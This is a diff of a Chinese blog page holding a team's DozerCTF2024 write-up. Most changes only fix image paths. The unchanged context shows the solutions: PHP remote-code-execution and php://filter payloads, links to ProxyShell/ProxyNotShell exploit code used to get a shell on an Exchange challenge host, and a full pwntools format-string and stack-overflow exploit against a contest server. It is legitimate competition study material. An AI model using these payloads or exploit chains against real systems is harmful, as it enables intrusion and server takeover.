@@ -19,7 +19,7 @@
     <meta name="description" content="前言：历时一天，最后拿到了团队第八，以下是团队的wp. web and misceasy_rce先上源码 123456789101112131415161718192021222324&lt;?phpheader(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);error_reporting(0);highlight_file(__FILE__)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DozerCTF2024">
-<meta property="og:url" content="http://example.com/2024/04/28/Dozerctf2024/index.html">
+<meta property="og:url" content="http://example.com/2024/04/28/Dozerctf/Dozerctf2024/index.html">
 <meta property="og:site_name" content="0raN9e的笔记">
 <meta property="og:description" content="前言：历时一天，最后拿到了团队第八，以下是团队的wp. web and misceasy_rce先上源码 123456789101112131415161718192021222324&lt;?phpheader(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);error_reporting(0);highlight_file(__FILE__)">
 <meta property="og:locale" content="zh_CN">
@@ -39,7 +39,7 @@
 <meta property="og:image" content="http://example.com/images/dozerctf2024/flag9.png">
 <meta property="og:image" content="http://example.com/images/dozerctf2024/%E5%B0%8A%E8%80%85.png">
 <meta property="article:published_time" content="2024-04-28T14:00:00.000Z">
-<meta property="article:modified_time" content="2024-04-29T08:28:35.856Z">
+<meta property="article:modified_time" content="2024-04-29T09:04:32.963Z">
 <meta property="article:author" content="orange">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
@@ -325,6 +325,14 @@
           <article class="post-content mx-auto">
             <h1 id="seo-header">DozerCTF2024</h1>
             
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年4月29日 下午
+                  
+                
+              </p>
+            
             
               <div class="markdown-body">
                 
@@ -337,7 +345,7 @@
 
 <p>试了一下好像不能用.&#x2F;来找,说一下localeconv()</p>
 <p>localeconv() 函数是一个编程语言函数，返回包含本地数字及货币信息格式的数组。这里可以通过这个函数读取当前目录下的文件名称。</p>
-<p><img src="/../images/dozerctf2024/rce.png" srcset="/img/loading.gif" lazyload alt="rce"></p>
+<p><img src="/../../images/dozerctf2024/rce.png" srcset="/img/loading.gif" lazyload alt="rce"></p>
 <p>可以知道flag就应该在fllllaaag.php，尝试直接得，</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">Parse error: syntax error, unexpected &#x27;&#123;&#x27; in /var/www/html/fllllaaag.php on line 3<br></code></pre></td></tr></table></figure>
 
@@ -350,7 +358,7 @@
 <p>又因为include那些被禁了，（劳累.jpg，也是靠队友，用file就行了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">cmd=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../images/dozerctf2024/rce1.png" srcset="/img/loading.gif" lazyload alt="rce1"></p>
+<p><img src="/../../images/dozerctf2024/rce1.png" srcset="/img/loading.gif" lazyload alt="rce1"></p>
 <h2 id="very-long-access"><a href="#very-long-access" class="headerlink" title="very_long_access"></a>very_long_access</h2><p>下载下来简要看一下内容吧，问了一下gpt,回答如下：</p>
 <p>这看起来像是一个网络服务器的日志条目。它包括了一个时间戳、用户代理字符串（表明是运行在 Windows 10 上的 Chrome 版本 108.0.0.0 浏览器），以及一个对资源”A”的GET请求，请求的数据大小为34760字节。有什么关于这个日志条目你想要了解或讨论的吗？</p>
 <p>感觉和wireshark的题目有点像，和时间有关系，发现时间并不是按顺序写的，撸个脚本排一下序。</p>
@@ -360,7 +368,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件 very_long_access.txt 以读取模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sorted_access_logs.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 创建一个空列表，用于存储每行的数据</span><br>    lines = []<br>    <span class="hljs-comment"># 逐行读取文件内容</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        <span class="hljs-comment"># 找到每行中 &quot;GET /&quot; 后面的内容，并添加到列表中</span><br>        start_index = line.find(<span class="hljs-string">&quot;GET /&quot;</span>) + <span class="hljs-number">5</span><br>        end_index = line.find(<span class="hljs-string">&quot; &quot;</span>, start_index)<br>        request = line[start_index:end_index]<br>        lines.append(request)<br><br><span class="hljs-comment"># 将提取到的数据拼接成一行</span><br>get_requests = <span class="hljs-string">&#x27;&#x27;</span>.join(lines)<br><br><span class="hljs-comment"># 将拼接后的数据写入到新的文件 get_requests.txt 中</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;get_requests.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(get_requests)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取并写入完成！&quot;</span>)<br><br></code></pre></td></tr></table></figure>
 
 <p>ctrl+f搜看看有没有惊喜，确实有</p>
-<p><img src="/../images/dozerctf2024/access.png" srcset="/img/loading.gif" lazyload alt="access"></p>
+<p><img src="/../../images/dozerctf2024/access.png" srcset="/img/loading.gif" lazyload alt="access"></p>
 <h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><p>上面一个可以输入，下面一个好像偏rce,尝试输入了一会并没有得到答案。我试了一下robots.txt，出来了一个dozer_f1ag.php,直接开开不了，那就代码审计一下吧。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html:/tmp&#x27;</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;function.php&#x27;</span>;<br><span class="hljs-variable">$func</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>]:<span class="hljs-string">&#x27;filters&#x27;</span>;<br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;function.php&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;去找fun吧！！！&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
 
@@ -377,9 +385,9 @@
 <p>最后构造payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span>=<span class="hljs-title">extract</span>&amp;<span class="hljs-title">file</span>=<span class="hljs-title">php</span>://<span class="hljs-title">filter</span>/<span class="hljs-title">function</span>.<span class="hljs-title">php</span>/<span class="hljs-title">convert</span>.<span class="hljs-title">base64</span>-<span class="hljs-title">encode</span>/<span class="hljs-title">resource</span>=<span class="hljs-title">dozer_f1ag</span>.<span class="hljs-title">php</span></span><br></code></pre></td></tr></table></figure>
 
-<p>解一下base64<img src="/../images/dozerctf2024/ser.png" srcset="/img/loading.gif" lazyload alt="ser"></p>
+<p>解一下base64<img src="/../../images/dozerctf2024/ser.png" srcset="/img/loading.gif" lazyload alt="ser"></p>
 <h2 id="上春山"><a href="#上春山" class="headerlink" title="上春山"></a>上春山</h2><p>二月天杨柳醉春烟..搞错了，看题目。</p>
-<p>什么玩意，我自己整理了一下<img src="/../images/dozerctf2024/%E4%B8%8A%E6%98%A5%E5%B1%B1.png" srcset="/img/loading.gif" lazyload alt="上春山"></p>
+<p>什么玩意，我自己整理了一下<img src="/../../images/dozerctf2024/%E4%B8%8A%E6%98%A5%E5%B1%B1.png" srcset="/img/loading.gif" lazyload alt="上春山"></p>
 <p>分析一下，一开始对暗号，然后聊天说东方有沉船搞个门路赚钱，最后flag应该和沉船有关系。说到这就应该好好拷打出题人了</p>
 <p>官方给了提示不一定在国内，出名的奢侈的。</p>
 <p>我们锁定范围(1911-1949年，出名，国外，奢侈，沉船)</p>
@@ -388,7 +396,7 @@
 <p>根据江湖黑话，上面的应该都是数字转化而来的，也就是当时沉船的经纬度转黑话，黑话再转MD5就行，最后就是flag.(好好拷打出题人)</p>
 <h2 id="se"><a href="#se" class="headerlink" title="se"></a>se</h2><p>wav的题目，一般都挺简单的吧</p>
 <p>听一下类似电话拨号的声音，网上的网站一把梭</p>
-<p><img src="/../images/dozerctf2024/se.png" srcset="/img/loading.gif" lazyload alt="se"></p>
+<p><img src="/../../images/dozerctf2024/se.png" srcset="/img/loading.gif" lazyload alt="se"></p>
 <p>962764453，卡壳了不知道接下来怎么写，emmmmm</p>
 <p>还好有万能的队友，用silenteye可以提出zip，再用这个密码就可以得到flag了。</p>
 <h2 id="shuiyin"><a href="#shuiyin" class="headerlink" title="shuiyin"></a>shuiyin</h2><p>嘿嘿，出题人总是不仔细啊，直接给flag也没下，那我接着面向答案的wp了。</p>
@@ -396,23 +404,23 @@
 <h2 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h2><p>正常答题就行，最后想抢手速也是于事无补。</p>
 <p>以下部分由队友完成我只是负责拼装。</p>
 <h2 id="简单的域渗透III-flag1"><a href="#简单的域渗透III-flag1" class="headerlink" title="简单的域渗透III-flag1"></a>简单的域渗透III-flag1</h2><p>发现被重定向</p>
-<p><img src="/../images/dozerctf2024/flag1.png" srcset="/img/loading.gif" lazyload alt="flag1"></p>
+<p><img src="/../../images/dozerctf2024/flag1.png" srcset="/img/loading.gif" lazyload alt="flag1"></p>
 <p>根据题目发现是exchange+office365</p>
-<p><img src="/../images/dozerctf2024/flag3.png" srcset="/img/loading.gif" lazyload alt="flag3"></p>
+<p><img src="/../../images/dozerctf2024/flag3.png" srcset="/img/loading.gif" lazyload alt="flag3"></p>
 <p>查阅文章<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/O6a40449vTKWUXS4kwD9xA">记一次曲折的exchange漏洞利用-ProxyMaybeShell (qq.com)</a></p>
 <p>proxyshell一梭拿到token</p>
 <p>脚本代码：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p>
-<p><img src="/../images/dozerctf2024/flag4.png" srcset="/img/loading.gif" lazyload alt="flag4"></p>
+<p><img src="/../../images/dozerctf2024/flag4.png" srcset="/img/loading.gif" lazyload alt="flag4"></p>
 <p>从github上撸到<a target="_blank" rel="noopener" href="https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3%E7%9B%B4%E6%8E%A5%E4%B8%80%E6%8A%8A%E6%A2%AD">https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py#L3直接一把梭</a></p>
-<p><img src="/../images/dozerctf2024/flag5.png" srcset="/img/loading.gif" lazyload alt="flag5"></p>
-<p><img src="/../images/dozerctf2024/flag6.png" srcset="/img/loading.gif" lazyload alt="flag6"></p>
+<p><img src="/../../images/dozerctf2024/flag5.png" srcset="/img/loading.gif" lazyload alt="flag5"></p>
+<p><img src="/../../images/dozerctf2024/flag6.png" srcset="/img/loading.gif" lazyload alt="flag6"></p>
 <p>拿到shell</p>
 <p>群里桌面和vpn两hint，找到如下</p>
-<p><img src="/../images/dozerctf2024/flag7.png" srcset="/img/loading.gif" lazyload alt="flag7"></p>
+<p><img src="/../../images/dozerctf2024/flag7.png" srcset="/img/loading.gif" lazyload alt="flag7"></p>
 <p>tar解压取出password</p>
-<p><img src="/../images/dozerctf2024/flag8.png" srcset="/img/loading.gif" lazyload alt="flag8"></p>
-<p><img src="/../images/dozerctf2024/flag9.png" srcset="/img/loading.gif" lazyload alt="flag9"></p>
+<p><img src="/../../images/dozerctf2024/flag8.png" srcset="/img/loading.gif" lazyload alt="flag8"></p>
+<p><img src="/../../images/dozerctf2024/flag9.png" srcset="/img/loading.gif" lazyload alt="flag9"></p>
 <p>flag{b5c1cd1c-45d8-4c5e-bf2e-d2b87419248f}</p>
 <h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="一个不对劲的溢出"><a href="#一个不对劲的溢出" class="headerlink" title="一个不对劲的溢出"></a>一个不对劲的溢出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;139.196.237.232&#x27;</span>,<span class="hljs-number">32916</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>payload = <span class="hljs-string">&#x27;aa%37$pbb%36$pcc%35$p&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&#x27;username?\n&#x27;</span>,payload)<br>p.recvuntil(<span class="hljs-string">&#x27;aa&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">231</span>-libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>p.recvuntil(<span class="hljs-string">&#x27;bb&#x27;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x0000A20</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pie--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br>p.recvuntil(<span class="hljs-string">&#x27;cc&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">18</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))<br>pop_rdi = <span class="hljs-number">0x00a83</span>+pie<br>system = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = libc_base+<span class="hljs-number">0x001b3d88</span><br>ret = <span class="hljs-number">0x000A84</span><br>main = pie+<span class="hljs-number">0x0007F0</span><br>og = [<span class="hljs-number">0x4f2be</span>,<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]<br>og_yuan = [<span class="hljs-number">0x4f29e</span>,<span class="hljs-number">0x4f2a5</span>,<span class="hljs-number">0x4f302</span>,<span class="hljs-number">0x10a2fc</span>]<br>shell = libc_base+og_yuan[<span class="hljs-number">0</span>]<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xd0</span>-<span class="hljs-number">0x8</span>)+p64(canary)+<span class="hljs-string">b&#x27;bbbbbbbb&#x27;</span><br><span class="hljs-comment">#payload+= p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br>payload+= p64(shell)<br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
@@ -428,7 +436,7 @@
 
 
 <h2 id="我是尊者"><a href="#我是尊者" class="headerlink" title="我是尊者"></a>我是尊者</h2><p>看到wp挺离谱，这么简单</p>
-<p><img src="/../images/dozerctf2024/%E5%B0%8A%E8%80%85.png" srcset="/img/loading.gif" lazyload alt="尊者"></p>
+<p><img src="/../../images/dozerctf2024/%E5%B0%8A%E8%80%85.png" srcset="/img/loading.gif" lazyload alt="尊者"></p>
 <p>Dozerctf{31de43b1a1fb565dabfa9ad8320f11de}</p>
 
                 
@@ -476,7 +484,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>DozerCTF2024</div>
-      <div>http://example.com/2024/04/28/Dozerctf2024/</div>
+      <div>http://example.com/2024/04/28/Dozerctf/Dozerctf2024/</div>
     </div>
     <div class="license-meta">
       
